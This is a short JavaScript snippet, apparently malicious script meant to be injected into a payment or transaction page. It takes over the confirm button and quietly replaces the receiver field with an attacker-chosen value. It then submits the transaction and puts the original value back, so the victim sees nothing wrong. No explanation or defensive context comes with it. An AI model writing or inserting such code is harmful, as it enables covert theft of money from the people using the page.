document.getElementById('confirmButton').onclick = injectMaliciousCode

function injectMaliciousCode() {
  let originalReceiverInput = document.getElementById('receiverInput');
  let originalValue = originalReceiverInput.value;
  originalReceiverInput.value = 'THANKS FOR YO MONEY BITCH';
  
  submitTransaction();
  originalReceiverInput.value = originalValue;
}
